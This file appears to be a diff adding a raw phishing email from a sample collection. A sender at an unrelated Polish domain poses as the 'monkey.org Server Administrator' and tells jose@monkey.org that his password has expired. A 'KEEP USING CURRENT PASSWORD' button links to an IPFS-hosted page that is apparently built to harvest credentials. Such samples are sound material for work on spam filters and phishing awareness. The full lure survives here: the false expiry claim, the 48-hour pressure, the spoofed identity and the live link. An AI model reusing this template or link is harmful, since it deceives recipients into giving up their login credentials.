@@ -1,0 +1,251 @@
+Return-Path: rekrutacja.zagorz@sumiriko.pl
+Delivered-To: jose@monkey.org
+X-FDA: 81683168826.19.5B1C6E6
+Received: from mta01.sumiriko.pl (mta01.sumiriko.pl [95.160.239.27])
+	by imf03.b.hostedemail.com (Postfix) with ESMTP id B366A120009
+	for <jose@monkey.org>; Mon, 15 Jan 2024 23:41:10 +0000 (UTC)
+Authentication-Results: imf03.b.hostedemail.com;	dkim=pass
+ header.d=sumiriko.pl header.s=098C9B2A-2E42-11E7-8D45-18AADB1E8F80
+ header.b=k7OPF3Gj;	spf=pass (imf03.b.hostedemail.com: domain of
+ rekrutacja.zagorz@sumiriko.pl designates 95.160.239.27 as permitted sender)
+ smtp.mailfrom=rekrutacja.zagorz@sumiriko.pl;	dmarc=pass (policy=none)
+ header.from=sumiriko.pl
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1705362072;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:	
+ content-transfer-encoding:content-transfer-encoding:in-reply-to:	
+ references:dkim-signature; bh=zEpQG0CmtNiJprqG1zGkG3l4zlXsCJN/8YJk7RH+rKU=;
+	b=i3FrtS3aZKpogNmK+sN4ZuwmnAL5Rh53KPiXbLK1362AC6emgHzYcOxskHfuf5jWvS4civ
+	/+r1vmjAbZRnaNISNLrZnEYVj+bsQsd5pBcoL+WbmUs2zQ34S9jkKHOyWLS3jvOdNCFfNo
+	70WaNfa+YTRaJO35ab5nK++a5tdvfKA=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1705362072; a=rsa-sha256;
+	cv=none;
+	b=J5K4nF0W2WbV1kpyd1GfU1S04/0O/QjSogbCb3pJBBEraNJRAqVsbZoaysHCvc50x52hhC
+	tjWIzjSQ8yhhvVrO8wTOrwsH1v+LpehPLbK0+Z164Ui4kxujSYmc/2ioQRmDS+GNXGRdeq
+	xpcVFoi+deGq49QVDG4ZnjVZA4eGq0Y=
+ARC-Authentication-Results: i=1;	imf03.b.hostedemail.com;	dkim=pass
+ header.d=sumiriko.pl header.s=098C9B2A-2E42-11E7-8D45-18AADB1E8F80
+ header.b=k7OPF3Gj;	spf=pass (imf03.b.hostedemail.com: domain of
+ rekrutacja.zagorz@sumiriko.pl designates 95.160.239.27 as permitted sender)
+ smtp.mailfrom=rekrutacja.zagorz@sumiriko.pl;	dmarc=pass (policy=none)
+ header.from=sumiriko.pl
+Received: from localhost (localhost [127.0.0.1])
+	by mta01.sumiriko.pl (Postfix) with ESMTP id CFA662382A52
+	for <jose@monkey.org>; Tue, 16 Jan 2024 00:33:59 +0100 (CET)
+Received: from mta01.sumiriko.pl ([127.0.0.1])
+	by localhost (mta01.sumiriko.pl [127.0.0.1]) (amavisd-new, port 10032)
+	with ESMTP id lNfNtcW_rDmV for <jose@monkey.org>;
+	Tue, 16 Jan 2024 00:33:59 +0100 (CET)
+Received: from localhost (localhost [127.0.0.1])
+	by mta01.sumiriko.pl (Postfix) with ESMTP id 51D9122015E8
+	for <jose@monkey.org>; Tue, 16 Jan 2024 00:30:43 +0100 (CET)
+DKIM-Filter: OpenDKIM Filter v2.10.3 mta01.sumiriko.pl 51D9122015E8
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=sumiriko.pl;
+	s=098C9B2A-2E42-11E7-8D45-18AADB1E8F80; t=1705361443;
+	bh=zEpQG0CmtNiJprqG1zGkG3l4zlXsCJN/8YJk7RH+rKU=;
+	h=From:To:Date:Message-ID:MIME-Version;
+	b=k7OPF3GjDFFIxYRwy9WImqUDphAgAdBgzHqOsI91Bkbu7ao/wY/lsA89fODRbvA2W
+	 SmfIBXSgI7cQAkTdTA+4GVrHcjUKck9pOl+HoJ5xVdTsuWosN6Tr2xx2lbjolA6VsG
+	 KekkZBwee1EglnMRBXcmbpw5+Thy16lFz5f7Ma2U=
+X-Virus-Scanned: amavisd-new at sumiriko.pl
+Received: from mta01.sumiriko.pl ([127.0.0.1])
+	by localhost (mta01.sumiriko.pl [127.0.0.1]) (amavisd-new, port 10026)
+	with ESMTP id 9C7jiKCRchwv for <jose@monkey.org>;
+	Tue, 16 Jan 2024 00:30:43 +0100 (CET)
+Received: from sumiriko.pl (unknown [102.90.58.75])
+	by mta01.sumiriko.pl (Postfix) with ESMTPSA id 4640F2361338
+	for <jose@monkey.org>; Tue, 16 Jan 2024 00:27:43 +0100 (CET)
+From: monkey.org Server Administrator <rekrutacja.zagorz@sumiriko.pl>
+To: jose@monkey.org
+Subject: Password Expired - monkey.org
+Date: 15 Jan 2024 18:32:17 -0500
+Message-ID: <20240115183217.F700ADF12AA80223@sumiriko.pl>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Server: rspam03
+X-Rspamd-Queue-Id: B366A120009
+X-Stat-Signature: c5kzy37aortdh6fbtyagaxczrm3oeh8n
+X-Rspam-User: 
+X-Spam-Status: No, score=0.30
+X-HE-Tag: 1705362070-528565
+X-HE-Meta: =?utf-8?q?U2FsdGVkX1+7dqztPQL1LYXcYMgrVeJDfCI5P79ivcF6eJ1drI5GdxZ?=
+ =?utf-8?q?+X8KCKD3HTRejPoDrgq9w62t7zc3mJQFElwikROlyTqCMv4qAOEwq/12uNe/xu9VT?=
+ =?utf-8?q?pyMoEosXi6YAW+GAHl/k7yDX9OtS5cvOFvzdDpoHTyAW8jJqAOoNgZHk/HzECDBPS?=
+ =?utf-8?q?jtGTq8dkKdS2gLsAaCQNVxOM2jWBTNj1YIipkjB/jYOV+Uuao1PoKvJIrtkYepzIQ?=
+ =?utf-8?q?axmHQAvYtMoSPB73jHH3ZN1PzE5tgbxUdK5OQwCvlHJLZ5VVND1mO4kPYYlw=3D?=
+ =?utf-8?q?=3D?=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 24
+
+<html><head>
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001">
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body>
+<div id=3D"editbody1">
+<div>
+<table width=3D"100%" align=3D"center" class=3D"v1x_v1row_mr_css_attr v1x_v=
+1row-3_mr_css_attr" id=3D"v1table1" style=3D"text-align: left; color: rgb(4=
+4, 54, 58); text-transform: none; letter-spacing: normal; font-family: Robo=
+to, sans-serif; font-size: 14px; font-style: normal; font-weight: 400; word=
+-spacing: 0px; white-space: normal; border-collapse: collapse; box-sizing: =
+border-box; orphans: 2; widows: 2; font-stretch: inherit; background-color:=
+ rgb(241, 244, 248); font-variant-ligatures: normal;=20
+font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
+thickness: initial; text-decoration-style: initial; text-decoration-color: =
+initial; font-variant-numeric: inherit; font-variant-east-asian: inherit;" =
+border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody style=3D"box-sizing: border-box;">
+<tr style=3D"box-sizing: border-box;">
+<td style=3D"box-sizing: border-box;">
+<table width=3D"640" align=3D"center" class=3D"v1x_v1row-content_mr_css_att=
+r v1x_v1stack_mr_css_attr" id=3D"v1table2" style=3D"width: 640px; color: rg=
+b(0, 0, 0); border-collapse: collapse; box-sizing: border-box; background-c=
+olor: rgb(255, 255, 255);" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"=
+>
+<tbody style=3D"box-sizing: border-box;">
+<tr style=3D"box-sizing: border-box;">
+<td width=3D"100%" class=3D"v1x_v1column_mr_css_attr" style=3D"border-width=
+: 0px; text-align: left; padding-top: 0px; padding-bottom: 0px; font-weight=
+: 400; vertical-align: top; box-sizing: border-box;">
+<table width=3D"100%" class=3D"v1x_v1text_block_mr_css_attr" id=3D"v1table3=
+" style=3D"border-collapse: collapse; box-sizing: border-box;" border=3D"0"=
+ cellspacing=3D"0" cellpadding=3D"0">
+<tbody style=3D"box-sizing: border-box;">
+<tr style=3D"box-sizing: border-box;">
+<td style=3D"padding: 20px 40px 10px; box-sizing: border-box;">
+<div style=3D"margin: 0px; padding: 0px; border: 0px currentColor; border-i=
+mage: none; font-family: sans-serif; vertical-align: baseline; box-sizing: =
+border-box; font-stretch: inherit;">
+<div style=3D'margin: 0px; padding: 0px; border: 0px currentColor; border-i=
+mage: none; color: rgb(85, 85, 85); line-height: 1.2; font-family: "Trebuch=
+et MS", "Lucida Grande", "Lucida Sans Unicode", "Lucida Sans", Tahoma, sans=
+-serif; font-size: 12px; vertical-align: baseline; box-sizing: border-box; =
+font-stretch: inherit;'>
+<p style=3D"margin: 0px; text-align: center; font-size: 14px; box-sizing: b=
+order-box;"><span style=3D"margin: 0px; padding: 0px; border: 0px currentCo=
+lor; border-image: none; color: rgb(0, 49, 136); font-family: inherit; font=
+-size: 14px; vertical-align: baseline; box-sizing: border-box; font-stretch=
+: inherit;"><strong style=3D"font-weight: bolder; box-sizing: border-box;">=
+<font color=3D"#6d89bc" face=3D"Tahoma">Password Expired - monkey.org</font=
+></strong><strong>
+</strong></span></p></div></div></td></tr></tbody></table>
+<table width=3D"100%" class=3D"v1x_v1text_block_mr_css_attr" id=3D"v1table4=
+" style=3D"border-collapse: collapse; box-sizing: border-box;" border=3D"0"=
+ cellspacing=3D"0" cellpadding=3D"0">
+<tbody style=3D"box-sizing: border-box;">
+<tr style=3D"box-sizing: border-box;">
+<td style=3D"padding: 10px 40px; box-sizing: border-box;">
+<div style=3D"margin: 0px; padding: 0px; border: 0px currentColor; border-i=
+mage: none; font-family: Tahoma, Verdana, sans-serif; vertical-align: basel=
+ine; box-sizing: border-box; font-stretch: inherit;">
+<div style=3D"margin: 0px; padding: 0px; border: 0px currentColor; border-i=
+mage: none; color: rgb(85, 85, 85); line-height: 1.5; font-family: Lato, Ta=
+homa, Verdana, Segoe, sans-serif; font-size: 12px; vertical-align: baseline=
+; box-sizing: border-box;">
+</div><p style=3D"margin: 0px 0px 0px 40px; padding: 0px; border: 0px curre=
+ntColor; border-image: none; text-align: left; color: rgb(85, 85, 85); line=
+-height: 1.5; font-family: Lato, Tahoma, Verdana, Segoe, sans-serif; font-s=
+ize: 12px; vertical-align: baseline; box-sizing: border-box;">
+<span style=3D"margin: 0px; padding: 0px; border: 0px currentColor; border-=
+image: none; color: rgb(109, 137, 188); font-family: inherit; font-size: 14=
+px; vertical-align: baseline; box-sizing: border-box; font-stretch: inherit=
+;">We want to inform you that the current password to your email&nbsp;<a hr=
+ef=3D"mailto:jose@monkey.org" rel=3D"noreferrer">jose@monkey.org</a>
+has expired.<br><span style=3D"margin: 0px; padding: 0px; border: 0px curre=
+ntColor; border-image: none; color: rgb(109, 137, 188); font-family: inheri=
+t; font-size: 14px; vertical-align: baseline; box-sizing: border-box; font-=
+stretch: inherit;">Our system will automatically log you out and generate a=
+ new password in 48 hours from <span style=3D"color: rgb(109, 137, 188); fo=
+nt-size: 14px;">1/15/2024 6:32:17 p.m.</span>
+<span style=3D"margin: 0px; padding: 0px; border: 0px currentColor; border-=
+image: none; color: rgb(109, 137, 188); font-family: inherit; font-size: 14=
+px; vertical-align: baseline; box-sizing: border-box; font-stretch: inherit=
+;"><br style=3D"box-sizing: border-box;">
+&nbsp;&nbsp;</span>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp=
+; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbs=
+p;<span style=3D"margin: 0px; padding: 0px; border: 0px currentColor; borde=
+r-image: none; color: rgb(109, 137, 188); font-family: inherit; font-size: =
+14px; font-style: normal; font-variant: normal; font-weight: normal; vertic=
+al-align: baseline; box-sizing: border-box; font-stretch: inherit;">&nbsp; =
+&nbsp;<br style=3D"box-sizing: border-box;">
+However, if you prefer to keep using your current password, you can simply =
+click the button below. This will allow you to retain your current password=
+ and continue accessing your email without any interruptions.<br></span></s=
+pan></span></p></div></td></tr></tbody></table></td>
+</tr>
+</tbody></table></td></tr></tbody></table>
+<table width=3D"100%" align=3D"center" class=3D"v1x_v1row_mr_css_attr v1x_v=
+1row-4_mr_css_attr" id=3D"v1table5" style=3D"text-align: left; color: rgb(4=
+4, 54, 58); text-transform: none; letter-spacing: normal; font-family: Robo=
+to, sans-serif; font-size: 14px; font-style: normal; font-weight: 400; word=
+-spacing: 0px; white-space: normal; border-collapse: collapse; box-sizing: =
+border-box; orphans: 2; widows: 2; font-stretch: inherit; background-color:=
+ rgb(241, 244, 248); font-variant-ligatures: normal;=20
+font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
+thickness: initial; text-decoration-style: initial; text-decoration-color: =
+initial; font-variant-numeric: inherit; font-variant-east-asian: inherit;" =
+border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody style=3D"box-sizing: border-box;">
+<tr style=3D"box-sizing: border-box;">
+<td style=3D"box-sizing: border-box;">
+<table width=3D"640" align=3D"center" class=3D"v1x_v1row-content_mr_css_att=
+r v1x_v1stack_mr_css_attr" id=3D"v1table6" style=3D"width: 640px; color: rg=
+b(0, 0, 0); border-collapse: collapse; box-sizing: border-box; background-c=
+olor: rgb(255, 255, 255);" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"=
+>
+<tbody style=3D"box-sizing: border-box;">
+<tr style=3D"box-sizing: border-box;">
+<td width=3D"100%" class=3D"v1x_v1column_mr_css_attr" style=3D"border-width=
+: 1px 0px 0px; border-style: solid none none; border-color: rgb(229, 234, 2=
+43) currentColor currentColor; text-align: left; padding-top: 0px; padding-=
+bottom: 0px; font-weight: 400; vertical-align: top; box-sizing: border-box;=
+">
+<table width=3D"100%" class=3D"v1x_v1button_block_mr_css_attr" id=3D"v1tabl=
+e7" style=3D"border-collapse: collapse; box-sizing: border-box;" border=3D"=
+0" cellspacing=3D"0" cellpadding=3D"10">
+<tbody style=3D"box-sizing: border-box;">
+<tr style=3D"box-sizing: border-box;">
+<td style=3D"box-sizing: border-box;">
+<div align=3D"center" style=3D"margin: 0px; padding: 0px; border: 0px curre=
+ntColor; border-image: none; vertical-align: baseline; box-sizing: border-b=
+ox;">
+<a style=3D"margin: 0px; padding: 5px 0px; border-radius: 4px; border: 1px =
+solid rgb(138, 59, 143); border-image: none; text-align: center; color: rgb=
+(255, 255, 255); font-family: Lato, Tahoma, Verdana, Segoe, sans-serif; tex=
+t-decoration: none; vertical-align: baseline; display: block; box-sizing: b=
+order-box; font-stretch: inherit; background-color: rgb(61, 96, 251);"=20
+href=3D"https://81864ea79e6fb8802f4b058a13f87783.ipfs.4everland.link/ipfs/b=
+afkreia2wgpwvfclmzg6xll3btfi3xfjmfgyxnb5pvffvogecxe2tya7e4#jose@monkey.org"=
+ target=3D"_blank" rel=3D"noopener noreferrer">
+<span style=3D"margin: 0px; padding: 0px; border: 0px currentColor; border-=
+image: none; line-height: 28px; letter-spacing: normal; font-family: inheri=
+t; font-size: 14px; vertical-align: baseline; display: inline-block; box-si=
+zing: border-box; font-stretch: inherit;"><strong>KEEP USING CURRENT PASSWO=
+RD</strong></span></a></div></td></tr></tbody></table>
+<table width=3D"100%" class=3D"v1x_v1text_block_mr_css_attr" id=3D"v1table8=
+" style=3D"border-collapse: collapse; box-sizing: border-box;" border=3D"0"=
+ cellspacing=3D"0" cellpadding=3D"10">
+<tbody style=3D"box-sizing: border-box;">
+<tr style=3D"box-sizing: border-box;">
+<td style=3D"box-sizing: border-box;">
+<div style=3D"margin: 0px; padding: 0px; border: 0px currentColor; border-i=
+mage: none; font-family: Tahoma, Verdana, sans-serif; vertical-align: basel=
+ine; box-sizing: border-box; font-stretch: inherit;">
+<div style=3D"margin: 0px; padding: 0px; border: 0px currentColor; border-i=
+mage: none; color: rgb(57, 61, 71); line-height: 1.2; font-family: Lato, Ta=
+homa, Verdana, Segoe, sans-serif; font-size: 14px; vertical-align: baseline=
+; box-sizing: border-box; font-stretch: inherit;">
+<p style=3D"margin: 0px; font-size: 14px; box-sizing: border-box;"><strong>=
+This email is generated by the&nbsp;monkey.org Email Server Administrator&n=
+bsp;for&nbsp;</strong><a href=3D"mailto:jose@monkey.org" rel=3D"noreferrer"=
+><strong>jose@monkey.org</strong></a></p></div></div></td></tr></tbody></ta=
+ble></td></tr></tbody></table></td></tr></tbody></table></div></div></body>=
+</html>
+
